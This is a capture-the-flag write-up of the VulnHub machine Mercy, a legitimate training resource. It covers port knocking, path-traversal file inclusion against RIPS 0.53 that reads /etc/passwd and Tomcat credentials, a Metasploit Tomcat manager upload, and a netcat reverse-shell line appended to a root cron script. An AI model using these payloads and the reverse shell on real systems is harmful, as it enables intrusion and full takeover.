# 🖥️ Mercy — VulnHub

| Field | Details |
|---|---|
| 🏷️ Machine | Mercy |
| 🌐 Platform | VulnHub |
| 🎯 Difficulty | Medium |
| 🧠 Topics | SMB Enumeration, Port Knocking, RIPS LFI, Tomcat Metasploit, Cron PrivEsc |
| 📅 Date | 6th November 2025 |
| 👤 Author | [Sandeep Prasad Chowdhury](https://github.com/chowdhurysandeep) |

---

## 📌 Summary

Mercy is a multi-service VulnHub machine. The attack path goes through SMB enumeration to find a port-knock config and credentials, port knocking to open HTTP, RIPS 0.53 LFI to read Tomcat credentials, Metasploit Tomcat shell, switching to user `fluffy`, and finally a world-writable root cron script for privilege escalation.

---

## 🔍 1. Reconnaissance & Enumeration

### Network Discovery

```bash
sudo netdiscover
```

Target IP: **<TARGET_IP>**

### Port Scan

```bash
nmap -sCV <TARGET_IP>
```

**Open Ports:**

| Port | Service | Notes |
|---|---|---|
| 22 | SSH | Open |
| 53 | DNS | Open |
| 80 | HTTP | Filtered |
| 110 | POP3 | Open |
| 139/445 | SMB | Open |
| 143/993 | IMAP/SSL | Open |
| 8080 | HTTP | Apache Tomcat/Coyote JSP Engine 1.1 |

> Port 80 is **filtered** — cannot browse directly.
> Port 8080 (Tomcat) is open. `robots.txt` reveals entry: `/tryharder/tryharder`

---

## 🔎 2. SMB Enumeration

```bash
enum4linux <TARGET_IP>
```

Shares found: `print$`, `qiu`, `IPC$`

### Connect via SMBClient

```bash
smbclient //<TARGET_IP>/qiu -U qiu
# Password: password
```

Navigate to `.private/opensesame/` and download the config file:

```bash
smb:\> cd .private
smb:\> cd opensesame
smb:\> get config
```

### Read the Config File

```bash
cat config
```

**Port Knocking sequence to open HTTP port 80:**

```
[openHTTP]
sequence = 159,27391,4
```

---

## 🚪 3. Port Knocking

```bash
knock <TARGET_IP> 159 27391 4
nmap <TARGET_IP>
```

✅ **Port 80 is now open** — confirmed via nmap rescan.

Browsing `http://<TARGET_IP>` shows the message:
> *"This machine shall make you plead for mercy! Bwahahahahaha!"*

Not directly useful — proceed to directory enumeration.

---

## 💥 4. Exploitation

### Directory Enumeration on Port 80

```bash
gobuster dir -u <TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
```

`robots.txt` reveals two hidden directories:

```
Disallow: /mercy
Disallow: /nomercy
```

### RIPS 0.53 — Local File Inclusion

Browsing `http://<TARGET_IP>/nomercy` opens **RIPS 0.53** — a PHP static code analyser web interface.

```bash
searchsploit rips 0.53
# Exploit Title: RIPS 0.53 - Multiple Local File Inclusions
```

Use LFI to read `/etc/passwd`:

```
http://<TARGET_IP>/nomercy/windows/code.php?file=../../../../../../etc/passwd
```

### Tomcat Credentials via LFI

Browsing port 8080 (`http://<TARGET_IP>:8080`) shows the **Apache Tomcat default "It works!" page**. At the bottom of the page it explicitly states:

> *"Users are defined in `/etc/tomcat7/tomcat-users.xml`"*

This tells us exactly where to look. Use LFI to read it:

```
http://<TARGET_IP>/nomercy/windows/code.php?file=../../../../../../var/lib/tomcat7/conf/tomcat-users.xml
```

**Credentials found in tomcat-users.xml:**

```xml
<user username="thisisasuperduperlonguser" password="heartbreakisinevitable" roles="admin-gui,manager-gui"/>
<user username="fluffy" password="freakishfluffybunny" roles="none"/>
```

> **Note:** Visiting `/tryharder/tryharder` on port 8080 also revealed a base64 encoded string which decoded to the same credentials hint.

---

### Metasploit — Tomcat Manager Upload

```bash
msfconsole
search tomcat
use exploit/multi/http/tomcat_mgr_upload    # use 18
set RHOST <TARGET_IP>
set RPORT 8080
set httpusername thisisasuperduperlonguser
set httppassword heartbreakisinevitable
run
```

✅ **Meterpreter session opened**

Spawn TTY shell:

```bash
shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

Switch to user fluffy:

```bash
su fluffy
# Password: freakishfluffybunny
```

✅ **Shell as `fluffy`**

---

## ⬆️ 5. Privilege Escalation

### Find World-Writable Cron Script

```bash
cd /home/fluffy/.private/secrets
ls -la
cat timeclock
```

**timeclock script contents:**

```bash
#!/bin/bash
now=$(date)
echo "The system time is: $now." > ../../../../../var/www/html/time
echo "Time check courtesy of LINUX" >> ../../../../../var/www/html/time
chown www-data:www-data ../../../../../var/www/html/time
```

The script is **owned by root** and has **full permissions (rwxrwxrwx)** — runs every 3 minutes as root.

### Inject Reverse Shell into Cron Script

Generate payload with msfvenom:

```bash
msfvenom -p cmd/unix/reverse_netcat lhost=<KALI_IP> lport=4444 R
```

Append the payload to the timeclock file:

```bash
echo "mkfifo /tmp/tuegcu; nc <KALI_IP> 4444 0</tmp/tuegcu | /bin/sh >/tmp/tuegcu 2>&1; rm /tmp/tuegcu" >> timeclock
```

Start listener on Kali:

```bash
nc -nlvp 4444
```

Wait up to 3 minutes for cron to execute. Once connected:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
whoami
# root
```

✅ **Root shell obtained**

---

## 🚩 6. Flag

```bash
ls /root
# author-secret.txt  config  proof.txt
cat /root/proof.txt
# Congratulations on rooting MERCY. :-)
```

---

## 📚 7. Lessons Learned

- Port knocking hides open ports — always check SMB/FTP shares for config files
- RIPS 0.53 LFI is a well-known exploit — always check web app versions on searchsploit
- Tomcat default pages **expose the path to credentials** (`tomcat-users.xml`) — read them carefully
- World-writable scripts run by root cron jobs are critical misconfigurations
- Tomcat manager with valid credentials is an instant Metasploit win

---

## 🛠️ Tools Used

- `netdiscover` — network discovery
- `nmap` — port scanning
- `enum4linux` — SMB enumeration
- `smbclient` — SMB file access
- `knock` — port knocking
- `gobuster` — directory enumeration
- `searchsploit` — exploit search
- `msfconsole` — Tomcat exploitation
- `msfvenom` — payload generation
- `netcat` — reverse shell listener

---

*Writeup by [Sandeep Prasad Chowdhury](https://github.com/chowdhurysandeep) — for educational purposes only.*
